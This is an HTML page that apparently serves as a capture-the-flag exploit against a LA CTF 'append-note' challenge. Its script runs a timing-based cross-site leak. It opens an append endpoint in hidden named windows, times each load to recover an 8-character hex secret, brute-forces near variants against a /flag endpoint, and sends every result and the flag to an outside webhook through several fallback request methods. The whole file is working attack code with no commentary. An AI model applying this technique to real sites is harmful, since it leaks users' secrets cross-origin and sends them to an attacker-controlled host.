<!DOCTYPE html>
<html>
<head><title>XS-Leak</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-298af.instancer.lac.tf";
var WEBHOOK = "https://polite-eagle-84.webhook.cool";
var CHARS = "0123456789abcdef";

// Report using multiple methods - try everything
function report(msg) {
    var encoded = encodeURIComponent(msg);
    
    // Method 1: Image
    try { 
        var img = new Image();
        img.src = WEBHOOK + "?i=" + encoded + "&t=" + Date.now();
    } catch(e) {}
    
    // Method 2: sendBeacon
    try { navigator.sendBeacon(WEBHOOK + "?b=" + encoded, msg); } catch(e) {}
    
    // Method 3: fetch no-cors
    try { fetch(WEBHOOK + "?f=" + encoded, {mode:'no-cors'}); } catch(e) {}
    
    // Method 4: Script tag
    try {
        var s = document.createElement('script');
        s.src = WEBHOOK + "?s=" + encoded;
        document.body.appendChild(s);
    } catch(e) {}
}

report("LOAD_V5");

// Use link click instead of form submit 
function testPrefix(prefix) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/");
        var wname = "w" + Math.random().toString(36).slice(2);
        
        // Create link and click it
        var a = document.createElement("a");
        a.href = url;
        a.target = wname;
        a.style.display = "none";
        document.body.appendChild(a);
        
        var t0 = performance.now();
        a.click();
        document.body.removeChild(a);
        
        setTimeout(function() {
            var elapsed = performance.now() - t0;
            try { 
                var w = window.open("", wname);
                if (w) w.close();
            } catch(e) {}
            resolve(elapsed);
        }, 350);
    });
}

async function trySecret(secret) {
    try {
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var text = await resp.text();
        if (text.indexOf("lactf") !== -1) {
            report("FLAG=" + text);
            return true;
        }
    } catch(e) {}
    return false;
}

async function main() {
    report("START");
    
    try {
        var secret = "";
        
        for (var pos = 0; pos < 8; pos++) {
            report("P" + pos);
            
            var results = [];
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await testPrefix(secret + c);
                results.push({ c: c, time: time });
            }
            
            results.sort(function(a, b) { return a.time - b.time; });
            var fast = results[0];
            var slow = results[results.length - 1];
            
            report("R" + pos + ":" + fast.c + "-" + slow.c);
            secret += fast.c;
        }
        
        report("S=" + secret);
        
        if (await trySecret(secret)) {
            report("FOUND");
            return;
        }
        
        // Bruteforce
        for (var pos = 0; pos < 8; pos++) {
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                if (secret[pos] === c) continue;
                var v = secret.substr(0, pos) + c + secret.substr(pos + 1);
                if (await trySecret(v)) {
                    report("BF=" + v);
                    return;
                }
            }
        }
        
        report("NOFLAG");
        
    } catch(e) {
        report("E=" + e.message);
    }
}

main();
</script>
</body>
</html>
